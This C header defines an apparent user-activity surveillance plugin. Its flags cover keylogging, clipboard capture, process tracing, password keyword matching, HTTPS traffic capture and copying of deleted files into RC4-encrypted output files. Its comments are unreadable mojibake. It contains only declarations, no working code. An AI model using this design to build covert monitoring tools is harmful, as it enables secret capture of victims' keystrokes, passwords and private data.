/**************************************************************
 * Module:
 *      T5UserAction.h
 *
 * Author:
 *      XieBo(secman_xie@hotmail.com)
 *
 *
 * Notes:
 *		�û���Ϊ�������
 *
 */

#ifndef _TJ_T5_USER_ACTION_H_
#define _TJ_T5_USER_ACTION_H_


#define USER_ACT_FILE_OP             0x00000001   // �û��ļ������켣
#define USER_ACT_KEYBOARD            0x00000002   // ���̼�¼
#define USER_ACT_CLIPBOARD           0x00000004   // ��������Ϣ
#define USER_ACT_PROC_TRACE          0x00000008   // ����ִ�й켣
#define USER_ACT_PROC_FILE           0x00000010   // �����ļ����ʹ켣
#define USER_ACT_EA_PASSWD           0x00000020   // �༭��EA_PASSWORD����ƥ��
#define USER_ACT_PASSWD_KEYMATCH     0x00000040   // ���ڱ���ؼ���ƥ��
#define USER_ACT_HTTPS_SEND          0x00000080   // HTTPS ����
#define USER_ACT_HTTPS_RECV          0x00000100   // HTTPS ����

#define USER_ACT_PLUGIN_VER          (1)          // ����汾��

#pragma pack( push )
#pragma pack(1)

// �û���Ϊ��Ϣ��ȡ����
//
typedef struct _USER_ACT_CFG
{
	DWORD	   dwSize;				              // �ṹ��С
	DWORD      dwFetch;                           // ��ȡ��Ϣ����
	DWORD      dwKeyListOffset;                   // ���ڱ���ؼ����б���ͷ���ƫ������������Ӣ��;�ָ���
	DWORD      dwKeyListLength;                   // ���ڱ���ؼ��ֳ��ȣ���������ֹ����UNICODE����ĳ���
	WCHAR     *lpwzKeyList;                       // ��ָ�����ɴ˽ṹʱ������NULL������ģ��õ����ݺ������޸�
	BOOL       bGetDelFile;                       // ɾ���ļ�ʱ����
	DWORD      dwMaxDelFile;                      // ɾ���ļ��Ĵ�С����
	DWORD      dwGetDelFileOffset;                // ɾ���ļ����������б�ͷ���ƫ����
	DWORD      dwGetDelFileLength;                // ɾ���ļ������ͳ��ȣ���������ֹ����UNICODE����ĳ���
	WCHAR     *lpwzGetDelFileType;                // ��ָ�����ɴ˽ṹʱ������NULL������ģ��õ����ݺ������޸�

}USER_ACT_CFG, *PUSER_ACT_CFG;

//
// ɾ���ļ����� ͷ��
//
typedef struct tagUSER_DELFILE_HEADER
{
	DWORD		dwHeaderSize;				// ͷ��С

	WCHAR		wzRealPath[MAX_PATH];		// �ļ�ԭ·��
	DWORD		dwFileSize;					// �ļ���С

	FILETIME	ftCreationTime;				// �ļ�����ʱ��
	FILETIME	ftLastAccessTime;			// �ļ�������ʱ��
	FILETIME	ftLastWriteTime;			// �ļ�����޸�ʱ��

	FILETIME	ftActionTime;				// �ļ�����ʱ��

} USER_DELFILE_HEADER,
*PUSER_DELFILE_HEADER;

//
// �����ļ���ͷ��
//
typedef struct _USER_ACT_FHEADER
{
	DWORD		dwSize;					          // �ṹ���С
	DWORD		dwPluginId;				          // ���Id
	DWORD       dwVersion;                        // ����汾��
	DWORD		dwMagicNumber;			          // ħ����
	DWORD       dwInfoType;                       // 0 - �û���Ϊ��Ϣ������̼�¼������ȣ�1 - ɾ�����ļ�
	DWORD       dwEncryptAlg;                     // �����㷨��0 - �޼��ܣ�1 - ���2 - RC4
	CHAR        chKey;                            // �������
	CHAR        szRc4Key[MAX_PATH];               // RC4��Կ

}USER_ACT_FHEADER, *PUSER_ACT_FHEADER;

#pragma pack( pop )


#endif  // _TJ_T5_USER_ACTION_H_